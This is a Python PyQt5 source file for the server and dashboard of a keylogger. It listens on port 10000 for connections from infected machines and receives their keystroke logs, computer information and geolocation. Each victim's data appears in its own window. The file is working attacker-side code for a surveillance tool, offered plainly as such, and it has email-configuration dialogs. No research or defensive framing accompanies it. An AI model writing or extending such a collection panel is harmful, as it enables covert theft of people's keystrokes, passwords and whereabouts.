import sys
import socket
import threading
from client2 import Ui_Widget2
from client3 import Ui_Widget3
from client4 import Ui_Widget4
from client5 import Ui_Widget5
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QVBoxLayout, QWidget, QLabel
from keylogger.Dashboard import Ui_MainWindow
from SetComputerInfo import Ui_SetComputerInfo
from SetEmailInfo import Ui_SetEmaiInfo
from PyQt5.QtCore import pyqtSignal, QObject


class ClientWindow(QMainWindow):
    def __init__(self, client_id, client_number):
        super().__init__()
        self.client_id = client_id
        self.client_number = client_number
        self.setWindowTitle(f"Client {client_number} - {client_id}")

        if client_number == 2:
            self.ui = Ui_Widget2()
        elif client_number == 3:
            self.ui = Ui_Widget3()
        elif client_number == 4:
            self.ui = Ui_Widget4()
        elif client_number == 5:
            self.ui = Ui_Widget5()
        else:
            layout = QVBoxLayout()
            self.client_label = QLabel(f"Client {client_number} Data")
            layout.addWidget(self.client_label)
            self.text_edit = QTextEdit()
            self.text_edit.setReadOnly(True)
            layout.addWidget(self.text_edit)
            container = QWidget()
            container.setLayout(layout)
            self.setCentralWidget(container)
            return

        self.ui.setupUi(self)

class Worker(QObject):
    keylog_signal: pyqtSignal = pyqtSignal(str, str)
    computer_info_signal: pyqtSignal = pyqtSignal(str, str)
    geo_location_signal: pyqtSignal = pyqtSignal(str, str)


    def __init__(self, ui, client_windows):
        super().__init__()
        self.ui = ui
        self.client_windows = client_windows
        self.clients = {}

    def start_server(self):
        bindsocket = socket.socket()
        bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bindsocket.bind(('0.0.0.0', 10000))
        bindsocket.listen(5)
        print("[*] Server listening on port 10000")

        while True:
            try:
                newsocket, fromaddr = bindsocket.accept()
                client_id = str(fromaddr)

                if len(self.client_windows) >= 4:
                    print(f"[-] Connection rejected: too many clients.")
                    newsocket.close()
                    continue

                self.clients[client_id] = newsocket
                print(f"[+] Client {client_id} connected")

                client_number = len(self.client_windows) + 2
                client_window = ClientWindow(client_id, client_number)
                client_window.show()
                self.client_windows[client_id] = client_window

                if client_id not in [self.ui.ComputerSelection.itemText(i) for i in range(self.ui.ComputerSelection.count())]:
                    self.ui.ComputerSelection.addItem(client_id)

                client_thread = threading.Thread(target=self.handle_client, args=(client_id, newsocket), daemon=True)
                client_thread.start()

            except Exception as e:
                print(f"[!] Error accepting client connection: {e}")

    def handle_client(self, client_id, newsocket):
        try:
            while True:
                try:
                    data = newsocket.recv(4096).decode()
                except Exception as e:
                    print(f"[!] Error decoding data from {client_id}: {e}")
                    break

                if data:
                    print(f"[+] Data from {client_id}: {data.strip()}")
                    self.handle_received_data(data.strip(), client_id)
                else:
                    break
        except Exception as e:
            print(f"[!] Error handling data from client {client_id}: {e}")
        finally:
            del self.clients[client_id]
            print(f"[-] Client {client_id} disconnected")
            self.client_windows[client_id].close()
            index = self.ui.ComputerSelection.findText(client_id)
            if index >= 0:
                self.ui.ComputerSelection.removeItem(index)

    def handle_received_data(self, data, client_id):
        if "KEYLOG" in data:
            print(f"[Worker] Emitting keylog for {client_id}")
            self.keylog_signal.emit(client_id, data)
        elif "COMPUTER_INFO" in data:
            print(f"[Worker] Emitting computer info for {client_id}")
            self.computer_info_signal.emit(client_id, data)
        elif "GEO_LOCATION" in data:
            print(f"[Worker] Emitting geo-location for {client_id}")
            self.geo_location_signal.emit(client_id, data)
        else:
            print(f"[!] Unknown data type from {client_id}: {data}")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.client_windows = {}

        self.ui.SetComputerInfo.clicked.connect(self.open_set_computer_info_window)
        self.ui.actionSet_Email_Info.triggered.connect(self.open_set_email_info_window)
        self.ui.RefreshButton.clicked.connect(self.refresh_logs)
        self.ui.actionLight_Mode.triggered.connect(self.set_light_mode)
        self.ui.actionDark_Mode.triggered.connect(self.set_dark_mode)
        self.ui.ComputerSelection.currentIndexChanged.connect(self.handle_client_selection)

        self.ui.ComputerSelection.clear()
        self.ui.ComputerSelection.addItems(["Computer 2", "Computer 3", "Computer 4", "Computer 5"])

        self.start_server_listener()

    def open_set_computer_info_window(self):
        self.child_window1 = QMainWindow()
        self.child_ui1 = Ui_SetComputerInfo()
        self.child_ui1.setupUi(self.child_window1)
        self.child_window1.show()

    def open_set_email_info_window(self):
        self.child_window2 = QMainWindow()
        self.child_ui2 = Ui_SetEmaiInfo()
        self.child_ui2.setupUi(self.child_window2)
        self.child_window2.show()

    def refresh_logs(self):
        print("Refreshing logs...")

    def set_light_mode(self):
        self.setStyleSheet("background-color: white; color: black;")
        print("Switched to light mode.")

    def set_dark_mode(self):
        self.setStyleSheet("background-color: #2E2E2E; color: white;")
        print("Switched to dark mode.")

    def start_server_listener(self):
        self.worker = Worker(self.ui, self.client_windows)
        self.worker.keylog_signal.connect(self.update_keylog_for_client)
        self.worker.computer_info_signal.connect(self.update_computer_info_for_client)
        self.worker.geo_location_signal.connect(self.update_geo_location_for_client)

        thread = threading.Thread(target=self.worker.start_server, daemon=True)
        thread.start()

    def handle_client_selection(self, index):
        if index < 0:
            return
        client_id = self.ui.ComputerSelection.itemText(index)
        if client_id in self.client_windows:
            window = self.client_windows[client_id]
            if not window.isVisible():
                window.show()
            window.raise_()
            window.activateWindow()

    def update_keylog_for_client(self, client_id, log_line):
        print(f"[MainWindow] Updating keylog for {client_id}")
        if client_id in self.client_windows:
            window = self.client_windows[client_id]
            ui = window.ui
            client_number = window.client_number
            try:
                getattr(ui, f"Client{client_number}_Keyloggs").appendPlainText(log_line)
            except AttributeError:
                print(f"[!] Client{client_number}_Keyloggs not found in UI")

    def update_computer_info_for_client(self, client_id, info):
        print(f"[MainWindow] Updating computer info for {client_id}")
        if client_id in self.client_windows:
            window = self.client_windows[client_id]
            ui = window.ui
            client_number = window.client_number
            try:
                getattr(ui, f"Client{client_number}_ComputerInformation").setPlainText(info)
            except AttributeError:
                print(f"[!] Client{client_number}_ComputerInformation not found in UI")

    def update_geo_location_for_client(self, client_id, location):
        print(f"[MainWindow] Updating geo location for {client_id}")
        if client_id in self.client_windows:
            window = self.client_windows[client_id]
            ui = window.ui
            client_number = window.client_number
            try:
                getattr(ui, f"Client{client_number}_GeoLocation").setPlainText(location)
            except AttributeError:
                print(f"[!] Client{client_number}_GeoLocation not found in UI")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())
